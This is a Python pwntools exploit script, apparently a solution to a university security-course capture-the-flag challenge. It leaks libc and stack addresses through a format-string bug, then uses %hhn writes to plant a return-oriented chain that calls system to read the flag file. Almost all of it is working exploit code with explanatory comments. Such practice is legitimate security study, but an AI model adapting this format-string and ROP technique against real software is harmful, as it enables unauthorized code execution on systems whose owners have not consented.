#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'critical'


conn = pwn.remote('tasks.ws24.softsec.rub.de', 33302)
# docker compose up
#conn = pwn.remote('127.0.0.1', 1024)

# use the provided lib c
#conn = pwn.process('./vuln_patched')

#pwn.gdb.attach(conn)

#vuln = pwn.ELF('./vuln')

# use my libc for local testing, switch to provided one for server
#libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = pwn.ELF('./libc.so.6')

offset_rop_gadget = pwn.ROP(libc).find_gadget(['pop rdi', 'ret'])
offset_padding = pwn.ROP(libc).find_gadget(['ret'])

"""
# print (rdi, rsi, rdx, rcx, r8, r9, stack)
conn.sendline(b'AAAAAAAABBBBBBBB%1$llx')
rdi = conn.recvline()
print(f'rdi = 0x{str(rdi)[(2+16):-3]}')

conn.sendline(b'AAAAAAAABBBBBBBB%2$llx')
rsi = conn.recvline()
print(f'rsi = 0x{str(rsi)[(2+16):-3]}')

conn.sendline(b'AAAAAAAABBBBBBBB%3$llx')
rdx = conn.recvline()
print(f'rdx = 0x{str(rdx)[(2+16):-3]}')

conn.sendline(b'AAAAAAAABBBBBBBB%4$llx')
rcx = conn.recvline()
print(f'rcx = 0x{str(rcx)[(2+16):-3]}')

conn.sendline(b'AAAAAAAABBBBBBBB%5$llx')
r8 = conn.recvline()
print(f' r8 = 0x{str(r8)[(2+16):-3]}')

conn.sendline(b'AAAAAAAABBBBBBBB%6$llx')
r9 = conn.recvline()
print(f' r9 = 0x{str(r9)[(2+16):-3]}')

for i in range(1,100):
    conn.sendline(b'AAAAAAAABBBBBBBB%' + str(i+6).encode('ascii') + b'$llx')
    stack = conn.recvline()
    print(f'ret + {i*8} (input {i+6}) = 0x{str(stack)[(2+16):-3]}')
conn.interactive()
"""


# I printed all values as shown above (comment), then I looked at the 48-bit (6Byte addresses)
# I used pwndbg to check which symbol the address has with: "info symbol 0x79ac90a29d90"
conn.sendline(b'%55$llx')
libc_pointer = conn.recvline()
libc_pointer = int(str(libc_pointer)[2:-3], 16)
# print pointer and check where it is: telescope 0x<pointer>
#print(hex(libc_pointer))

libc_start = libc_pointer - libc.symbols['__libc_start_main'] - 133

# rcx has pointer to start of buffer (read via 4-th argument)
conn.sendline(b'%4$llx')
start_address_of_buffer = conn.recvline()
start_address_of_buffer = int(str(start_address_of_buffer)[2:-3], 16)

libc_system = libc_start + libc.symbols['system']
rop_shell_string = libc_start + next(libc.search(b'/bin/sh\x00'))
rop_gadget = libc_start + offset_rop_gadget[0]
rop_padding = libc_start + offset_padding[0]


print(f'       system = {hex(libc_system)}')
print(f'      /bin/sh = {hex(rop_shell_string)}')
print(f' pop rdi;ret; = {hex(rop_gadget)}')
print(f'         ret; = {hex(rop_padding)}')
print(f' start_buffer = {hex(start_address_of_buffer)}')


address_for_rop_chain = start_address_of_buffer + 168

address_to_cat_string = address_for_rop_chain + 32
rop_chain = [
    pwn.p64(rop_gadget),
    pwn.p64(address_to_cat_string),
    pwn.p64(rop_padding),
    pwn.p64(libc_system),
    b'/bin/cat ',
    b'/flag\x00\x00\x00\x00'
]

rop_chain = b''.join(gadget for gadget in rop_chain)

for off, byte in enumerate(rop_chain):
    format_string = b''
    
    if byte != 0:
        format_string += b'%' + str(byte).encode('ascii') + b'd'

    format_string += b'%16$hhn\x00'

    # pad with zero bytes sothat multiple of 8
    padding_length = (8 - (len(format_string) % 8)) % 8
    format_string += b'\x00' * padding_length

    # write an address into buffer (this is the 16th argument)
    # will be interpreted as a pointer => we can write to arbitrary memory
    format_string += pwn.p64(address_for_rop_chain + off)

    conn.sendline(format_string)
    

# send EOF to trigger ropchain
conn.shutdown('out')
flag = conn.recvall()
print(flag)


conn.close()
